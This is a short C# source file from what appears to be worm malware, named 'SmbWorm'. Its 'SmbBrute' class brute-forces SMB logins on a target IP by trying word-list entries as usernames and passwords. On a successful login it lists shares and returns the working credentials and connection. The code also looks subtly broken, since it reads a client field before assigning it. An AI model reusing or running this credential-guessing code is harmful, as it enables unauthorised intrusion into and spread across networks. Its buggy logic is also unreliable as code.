using System.Net;
using System.Threading;
using SMBLibrary;
using SMBLibrary.Client;

namespace SmbWorm;

internal class SmbBrute
{
	public static Brute Brutforce(string Ips, string[] list)
	{
		Brute brute = new Brute();
		brute.Bruted = false;
		brute.Ip = Ips;
		foreach (string password in list)
		{
			foreach (string text in list)
			{
				SMB2Client sMB2Client = new SMB2Client();
				if (!sMB2Client.Connect(IPAddress.Parse(Ips), SMBTransportType.DirectTCPTransport))
				{
					return null;
				}
				if (sMB2Client.Login(string.Empty, text, password) == NTStatus.STATUS_SUCCESS)
				{
					brute.SMB2Client.ListShares(out var status);
					if (status == NTStatus.STATUS_SUCCESS)
					{
						brute.Login = text;
						brute.Password = password;
						brute.Bruted = true;
						brute.SMB2Client = sMB2Client;
						return brute;
					}
				}
				sMB2Client.Disconnect();
				Thread.Sleep(5);
			}
		}
		return brute;
	}
}
